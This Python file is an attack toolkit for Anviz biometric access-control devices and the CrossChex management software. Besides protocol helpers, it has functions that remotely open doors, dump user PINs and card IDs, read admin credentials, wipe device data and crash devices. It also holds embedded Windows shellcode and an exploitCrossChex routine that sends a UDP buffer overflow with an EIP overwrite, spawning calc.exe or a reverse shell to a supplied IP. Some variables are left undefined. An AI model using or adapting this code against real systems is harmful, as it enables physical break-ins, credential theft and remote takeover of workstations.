import socket
import anvizCRC
import struct
import binascii
import ipaddress
import codecs
import time
import sys

# Scapy
from scapy.all import Raw,IP,Dot1Q,UDP,Ether
import scapy.all

# GLOBAL VARIABLES

STX = b"\xA5"  # Preamble

# REQUESTS
CMD_GET_INFO = b'\x30'  # GET INFO
CMD_SET_INFO = b'\x31'  # SET INFO
CMD_GET_INFO_EXTENDED = b'\x32'  # GET INFO Extended
CMD_SET_INFO_EXTENDED = b'\x33'  # SET INFO
CMD_GET_DATE = b'\x38'  # GET DATE
CMD_SET_DATE = b'\x39'  # SET DATE
CMD_GET_NETWORK = b'\x3A'  # GET TCP/IP Configurations
CMD_SET_NETWORK = b'\x3B'  # SET TCP/IP Configurations
CMD_GET_RECORDS = b'\x3C'  # GET RECORDS
CMD_DOWNLOAD_RECORDS = b'\x40'  # DOWNLOAD RECORDS
CMD_UPLOAD_RECORDS = b'\x41'  # UPLOAD RECORDS
CMD_DOWNLOAD_INFO = b'\x42'  # DOWNLOAD STAFF INFO
CMD_DOWNLOAD_FINGERPRINT = b'\x44'  # DOWNLOAD USER FINGERPRINT
CMD_UPLOAD_FINGERPRINT = b'\x45'  # UPLOAD USER FINGERPRINT
CMD_GET_SN = b'\x46'  # GET DEVICE SN
CMD_SET_SN = b'\x47'  # SET DEVICE SN
CMD_GET_TYPECODE = b'\x48'  # GET DEVICE TYPE CODE
CMD_SET_TYPECODE = b'\x49'  # SET DEVICE TYPE CODE
CMD_GET_FACTORYINFOCODE = b'\x4A'  # GET DEVICE TYPE CODE
CMD_SET_FACTORYINFOCODE = b'\x4B'  # SET DEVICE TYPE CODE
CMD_DEL_USERDATA = b'\x4C'  # DELETE USER DATA
CMD_INIT_USERDATA = b'\x4D'  # Init User Data
CMD_DEL_RECORDS = b'\x4E'  # Delete Records
CMD_INIT_SYSTEM = b'\x4F'  # Init SYSTEM
CMD_GET_TIMEZONE = b'\x50'  # GET TIMEZONE
CMD_SET_TIMEZONE = b'\x51'  # SET TIMEZONE
CMD_GET_GROUPINFO = b'\x52'  # GET GROUP INFO
CMD_SET_GROUPINFO = b'\x53'  # SET GROUP INFO
CMD_GET_BELLINFO = b'\x54'  # GET Scheduale Bell info
CMD_SET_RINGINFO = b'\x55'  # SET Ring Info
CMD_GET_MESSAGE = b'\x56'  # GET Messages
CMD_SET_MESSAGE = b'\x57'  # SET messages
CMD_GET_MESSAGES_HEADERS = b'\x58'  # GET Messages subjects
CMD_DEL_MESSAGE = b'\x59'  # DELETE MESSAGES
CMD_GET_STATEMESSASE = b'\x5A'  # GET T&A STATE MESSAGES ENTER;EXIT;BREAK
CMD_SET_STATEMESSASE = b'\x5B'  # SET T&A STATE MESSAGES
CMD_ENROLL_FP_ONLINE = b'\x5C'  # ENROLL FINGERPRINT, USE DEVICE TO SCAN
CMD_GET_CAPACITY = b'\x5A'  # GET CAPACITY
CMD_OPENDOOR = b'\x5E'  # Open Door
CMD_SET_RECORD = b'\x5F'  # Adds record
CMD_GET_CUSTOMSTATETABLE = b'\x70'  # GET T&A STATE Table
CMD_SET_CUSTOMSTATETABLE = b'\x71'  # SET T&A STATE Table
CMD_DOWNLOAD_USERS = b'\x72'  # DOWNLOAD Users
CMD_UPLOAD_USER = b'\x73'  # UPLOAD Users extended
CMD_GET_DEVICEID = b'\x74'  # GET DEVICE ID
CMD_SET_DEVICEID = b'\x75'  # SET DEVICE ID
CMD_DEL_ADMIN_FLAG = b'\x3D'  # CLEAR ADMINISTRATOR FLAG
CMD_GET_EMPLOYE_ENROLL_TIME = b'\x3E'  # Get the time a employe enrols
CMD_SET_EMPLOYE_ENROLL_TIME = b'\x3F'  # Set the time a employe enrols
CMD_GET_RANDOM = b'\x76'  # Get Random Number
CMD_SET_ENCRYPT = b'\x77'  # Encrypt device type and language with random number
CMD_GET_SERIALNUMBER = b'\x24'  # GET DEVICE SERIAL NUMBER
CMD_SET_SERIALNUMBER = b'\x25'  # SET DEVICE SERIAL NUMBER
CMD_UPLOAD_FIRMWARE = b'\x10'  # WARNING! UPLOAD OF FIRMWARE AND PHOTOS/VOICE
CMD_GET_DAYLIGHT = b'\x1A'  # Get daylight saving flag and time zone
CMD_SET_DAYLIGHT = b'\x1B'  # Set daylight saving flag and time zone
CMD_GET_LANG = b'\x18'  # Get Language settings
CMD_SET_LANG = b'\x19'  # Set Language settings
CMD_EMULATE_INTERACTION = b'\x78'  # Emulate a physical interaction on the device, such as a card being scanned
CMD_GET_GPRS = b'\x16'  # Get GPRS
CMD_SET_GPRS = b'\x16'  # Set GPRS
CMD_GET_DEVICE_INFO_EXTENDED = b'\x7A'
CMD_SET_DEVICE_INFO_EXTENDED = b'\x7B'

# Reverse Engineered Information
CMD_GET_DEVICES = b'\x02'  # GET DEVICES

# This are commands for legacy equipment
OA3000_CMD_GET_INDEX_MESSAGE = b'\x26'  # GET INDEX MESSAAGE FOR MODEL OA3000 ONLY
OA3000_CMD_SET_INDEX_MESSAGE = b'\x27'  # SET INDEX MESSAAGE FOR MODEL OA3000 ONLY
OA3000_CMD_GET_MESSAGES = b'\x28'  # Get Subject/Hedears of messages
OA3000_CMD_DEL_MESSAGES = b'\x29'  # Delete Subject/Hedears of messages
OA3000_CMD_GET_STATUS_SWITCHING = b'\x20'  # GET TA auto switching states
OA3000_CMD_SET_STATUS_SWITCHING = b'\x21'  # GET TA auto switching states

M761_CMD_DOWNLOAD_USERS = b'\x22'  # Model 761 Download User Database
M761_CMD_UPLOAD_USERS = b'\x22'  # Model 761 Upload User Database
M761_CMD_FILEMANAGER = b'\x12'  # Model 761 File Manager Command
M761_CMD_GET_LOG = b'\x13'  # Download Log Records

VFP_CMD_GET_SPECIAL_STATE = b'\x2F'  # GET special state, whatever that is

CMD_GET_PHOTO_AMOUNT = b'\x2A'  # Get ammount of photos
CMD_GET_PHOTO_INFO = b'\x2B'  # Get photos info
CMD_GET_PHOTO_USER = b'\x2C'  # Get user photos

T5X_CMD_GET_ADMIN = b'\x1C'  # Get admin card/password on T5X devices
T5X_CMD_SET_ADMIN = b'\x1D'  # Set admin card/password on T5X devices

T5S_CMD_GET_PUNCHCARD = b'\x7E'  # inquire information of punched card on T5S

C5_CMD_SEND_EMAIL = b'\x7F'

# RESPONSES
ACK_SUCCESS = b"\x00"  # operation successful
ACK_FAIL = b"\x01"  # operation failed
ACK_FULL = b"\x04"  # user full
ACK_EMPTY = b"\x05"  # user empty
ACK_NO_USER = b"\x06"  # user not exist
ACK_TIME_OUT = b"\x08"  # capture timeout
ACK_USER_OCCUPIED = b"\x0A"  # user already exists
ACK_FINGER_OCCUPIED = b"\x0B"  # fingerprint already exists

# SHELLCODE options

# shellcode working calc.exe
calculator_payload = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
calculator_payload += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
calculator_payload += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
calculator_payload += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
calculator_payload += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
calculator_payload += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
calculator_payload += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
calculator_payload += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
calculator_payload += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
calculator_payload += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
calculator_payload += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
calculator_payload += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
calculator_payload += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
calculator_payload += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
calculator_payload += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# shellcode windows x86 reverse_shell
shell_payload_1 = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shell_payload_1 += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shell_payload_1 += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shell_payload_1 += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shell_payload_1 += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shell_payload_1 += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shell_payload_1 += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shell_payload_1 += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shell_payload_1 += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shell_payload_1 += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shell_payload_1 += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shell_payload_1 += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell_payload_1 += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
shell_payload_1 += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
shell_payload_1 += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68"

# shellcode windows x86 reverse_shell (part_2)
shell_payload_2 = b"\x68\x02\x00\x01\xbd\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
shell_payload_2 += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
shell_payload_2 += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
shell_payload_2 += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
shell_payload_2 += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
shell_payload_2 += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
shell_payload_2 += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shell_payload_2 += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
shell_payload_2 += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell_payload_2 += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

def makePayload(command, data='', CH=b"\x00\x00\x00\x00"):
    if len(data) < 0x190:

        # Fix size for data 2 bytes
        size = len(data)
        size2b = bytes.fromhex(format(size, '#06x').replace("0x", ""))

        request = STX + CH + command + size2b
        if size > 0x00:  # Aditional data in channel
            request = request + data

        # Add CRC16
        CRC = anvizCRC.calculateRevAnvizCRC(request)
        b = struct.pack(">H", CRC)
        request = request + b

        #print("[*] CRC: %s " % binascii.hexlify(request))

        return request
    else:
        raise Exception('Data size too big')


def sendPayload(ip, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.0)
    s.connect((ip, port))
    #print("[*] Sending payload: %s" % binascii.hexlify(payload))
    s.send(payload)
    response = s.recv(512)
    s.close()

    # Creating the tuple of the data
    preamble = response[0]  # 1 byte
    deviceCode = response[1:5]  # 4 bytes
    ack = response[5]  # 1 byte
    returnValue = response[6]  # 1 byte
    size = response[7:9]  # 2 bytes
    size = struct.unpack(">H", size)[0]


    #print("[*] Response: %s" % binascii.hexlify(response))

    # sanity check for data integrity
    if (len(response) != (9 + int(size) + 2)):  # 9 bytes from previous values plus size of the packet plus 2 bytes for CRC16
        raise Exception("Packet Size differs from actual size")

    data = b''
    crc = b''
    if (size > 0):
        data = response[9:(9 + int(size) + 1)]  # start of data at 9th byte plus size of data plus 1 for the last byte
        crc = response[(9 + size + 1):]  # From end of data to the end of the array
    else:
        crc = response[9:]  # no data, so just finish with the CRC

    # return the packet
    return (preamble, deviceCode, ack, returnValue, size, data, crc)


def sendUDPBroadcast(ip="255.255.255.255", sport=5060, dport=5050):
    scapy.all.sendp( Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=1)/IP(dst=ip)/UDP(sport=sport,dport=dport)/Raw(load=b'\xa5\x00\x00\x00\x00\x02\x00\x00\x47\x23') )


def setUDPServer(ip='', port=5060, timeout=5):
    # Datagram (udp) socket
    try :
    	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
    	print('[!] Failed to create server socket')

    # Bind socket to local ip and port
    try:
    	s.bind((ip, port))
    except:
    	print('[*] Server socket bind failed')
    	sys.exit()

    print('[*] Searching for devices')
    s.settimeout(timeout)
    timeout = time.time() + timeout
    deviceCounter = 0
    responses = []

    while True:
        if time.time() > timeout:
            break
        try:
            response = s.recvfrom(1024)
            responses.append(response)
            deviceCounter = deviceCounter + 1

            #print(response)
        except socket.timeout:
            print("[*] Found %d devices" % deviceCounter)
    s.close()
    return responses


def getConfig(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_INFO, CH=CH)
    (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)

    # Creating the tuple of the data
    firmware_version = data[0:8]  # 1 byte
    comm_password = data[8:11]  # 4 bytes

    # comm_password_len = binascii.hexlify(data[8]])[1:6] # ignore first 4 bits for password length
    prepend_bits = bytearray(b'0')
    password_array = bytearray(passwd)
    password_array = prepend_bits + password_array
    passwd = int.from_bytes(codecs.decode(password_array, 'hex'), byteorder="big", signed=True)
    sleep_time = data[8:11]


    print(data)
    return data
    # return response

def openDoor(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_OPENDOOR, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getDateOfDevice(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_DATE, CH=CH)
    (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)
    print(data)
    return data
    # return response


def getNetwork(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_NETWORK, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getUserRecordsAmount(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_RECORDS, CH=CH)
    (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)

    user_amount = data[1:3]
    fp_amount = data[4:6]
    password_amount = data[7:9]
    card_amount = data[10:12]
    all_record_amount = data[13:15]
    new_record_amount = data[16:18]

    user_amount = struct.unpack(">H", user_amount)[0]
    print("\n[%s] Number of users: %d\n" % (ip, int(user_amount)))
    return (user_amount, fp_amount, password_amount, card_amount, all_record_amount, new_record_amount)


def getUserRecords(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_RECORDS, CH=CH)
    (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)

    user_amount = data[1:3]
    fp_amount = data[4:6]
    password_amount = data[7:9]
    card_amount = data[10:12]
    all_record_amount = data[13:15]
    new_record_amount = data[16:18]

    user_amount = struct.unpack(">H", user_amount)[0]
    print("\n[*] Number of users: %d\n" % int(user_amount))

    user_count = 0
    payload_data = b'\x01\x0c'
    for i in range(0, (int(user_amount)%12)): # data length: 12*30 = 360Byte
        payload = makePayload(CMD_DOWNLOAD_USERS, data=payload_data, CH=CH)
        (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)
        payload_data = b'\x00\x0c'
        user_count_page = 0
        base = 1

        # print("[*] data: %s" % data)

        while user_count < user_amount and user_count_page < 12:
            user_id = data[base+1:(base+5)]
            passwd_len = data[base+5] >> 4

            # temporary dirty fix for passwd just to make it work
            passwd = binascii.hexlify(data[(base+5):(base+8)])[1:6] # ignore first 4 bits for password length
            prepend_bits = bytearray(b'0')
            password_array = bytearray(passwd)
            password_array = prepend_bits + password_array
            passwd = int.from_bytes(codecs.decode(password_array, 'hex'), byteorder="big", signed=True)
            user_id = struct.unpack(">I", user_id)[0]

            card_id = data[(base+8):(base+12)]
            card_id = int.from_bytes(card_id, byteorder="big", signed=False)
            name = data[(base+12):(base+22)]
            department = data[(base+23)]
            group = data[(base+24)]
            attendance_mode = data[(base+25)]
            fp_enroll_state = data[(base+26):(base+27)]
            pwd_last_8_digit = data[(base+28)]
            keep = data[(base+29)]
            special_info = data[(base+30)]

            print("[*] User: %s" % user_id)
            print("[*] \tName: %s" % name)
            print("[*] \tPassword_len: %s" % passwd_len)
            print("[*] \tPassword: %s" % passwd)
            print("[*] \tCard ID: %s\n" % card_id)

            user_count = user_count + 1
            user_count_page = user_count_page + 1
            base = base + 30

    return (preamble, deviceCode, ack, returnValue, size, data, crc)


def getFactoryInfoCode(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_FACTORYINFOCODE, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def initUserArea(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_INIT_USERDATA, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def initSystem(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_INIT_SYSTEM, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getSchedualeBell(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_BELLINFO, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getHeadersOfMessages(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_MESSAGES_HEADERS, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getTAStateMessage(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_STATEMESSASE, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getDeviceCapacity(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_CAPACITY, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getStateTable(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_CUSTOMSTATETABLE, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getCOMMID(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_DEVICEID, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def clearAdminFlag(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_DEL_ADMIN_FLAG, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getRandomNumber(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_RANDOM, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getSerialNumber(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_SERIALNUMBER, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getSpecialState(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(VFP_CMD_GET_SPECIAL_STATE, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getPhotoAmount(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_PHOTO_AMOUNT, CH=CH)
    response = sendPayload(ip, port, payload)
    return response



def getAdminOrCardCredentials(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(T5X_CMD_GET_ADMIN, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getDaylight(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_DAYLIGHT, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getLanguages(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_LANG, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getGPRSSettings(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_GPRS, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getDeviceExtendedInformation(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(CMD_GET_DEVICE_INFO_EXTENDED, CH=CH)
    response = sendPayload(ip, port, payload)
    return response


def getCardInfo(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    payload = makePayload(T5S_CMD_GET_PUNCHCARD, CH=CH)
    response = sendPayload(ip, port, payload)
    return response

def dos(ip, port=5010, CH=b"\x00\x00\x00\x00"):
    data = ''
    payload = makePayload(0xFF, data=data, CH=CH)
    response = sendPayload(ip, port, payload)
    return response

def getDevices(ip="255.255.255.255", timeout=5):
    sendUDPBroadcast(ip=ip,sport=5060, dport=5050)
    responses = setUDPServer(timeout=timeout)

    for (response, (ip, port)) in responses:
        # Creating the tuple of the data
        preamble = response[0]  # 1 byte
        deviceCode = response[1:5]  # 4 bytes
        ack = response[5]  # 1 byte
        returnValue = response[6]  # 1 byte
        size = response[7:9]  # 2 bytes
        size = struct.unpack(">H", size)[0]

        # sanity check for data integrity
        if (len(response) != (9 + size + 2)):  # 9 bytes from previous values plus size of the packet plus 2 bytes for CRC16
            raise Exception("Packet Size differs from actual size")

        data = b''
        crc = b''
        if (size > 0):
            data = response[9:(9 + int(size) + 1)]  # start of data at 9th byte plus size of data plus 1 for the last byte

            model = data[0:4]
            serialnumber = data[10:26]
            device_ip = data[26:30]
            netmask = data[30:34]
            gateway = data[34:38]
            # 13 bytes do discover
            firmware_version = data[51:59]

            print("[*] Response from %s:%d" % (ip, port))
            print("[*] Serial number: %s" % serialnumber)
            print("[*] Firmware version: %s" % firmware_version)
            print("[*] Network information:")
            print("[*] \tIP: %s" % ipaddress.IPv4Address(device_ip))
            print("[*] \tNetmask: %s" % ipaddress.IPv4Address(netmask))
            print("[*] \tGateway: %s" % ipaddress.IPv4Address(gateway))

            crc = response[(9 + size + 1):]  # From end of data to the end of the array
        else:
            crc = response[9:]  # no data, so just finish with the CRC

        # return the packet
        return (preamble, deviceCode, ack, returnValue, size, data, crc)

    return response

def ipToShellcode(ip):
  a = ip.split('.')
  b = hex(int(a[0])) + hex(int(a[1])) + hex(int(a[2])) + hex(int(a[3]))
  b = b.replace("0x","")
  return binascii.unhexlify(b)

def sendFuzzingUDPBroadcast(ip="255.255.255.255", interface="eth0", sport=5050, dport=5060):
    shell = False # default is drop calc function

    request = b"A"*77 # Original payload substitute
    request += b"B"*184
    request += b"\x07\x18\x42\x00" # EIP - 00421807 crosscheck_standard.exe
    request += b"A"*4
    # 269 bytes

    if (ip != "255.255.255.255"):
        request = request + shell_payload_1 + ipToShellcode(ip) + shell_payload_2
    else:
        request = request + calculator_payload

    request += buf
    scapy.all.sendp( Ether(src='00:00:00:00:00:00', dst="ff:ff:ff:ff:ff:ff")/IP(src=ip,dst='255.255.255.255')/UDP(sport=sport,dport=dport)/Raw(load=request),  iface=interface )

def setFuzzUDPServer(ip='', interface='eth0', port=5050, timeout=150):
    # Datagram (udp) socket
    try :
    	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
    	print('[!] Failed to create server socket')

    # Bind socket to local ip and port
    try:
    	s.bind(('', port))
    except:
    	print('[*] Server socket bind failed')
    	sys.exit()

    print('[*] Waiting for crosschex')
    s.settimeout(timeout)
    timeout = time.time() + timeout
    responses = []

    while True:
        if time.time() > timeout:
            break
        try:
            response = s.recvfrom(1024)
            print(response)
            responses.append(response)
            sendFuzzingUDPBroadcast(ip=ip, interface=interface)
            response = s.recvfrom(1024)            
        except socket.timeout:
            print("[!] Error with UDP server")

    s.close()
    return responses

def exploitCrossChex(ip, interface):
    setFuzzUDPServer(ip=ip, interface=interface)
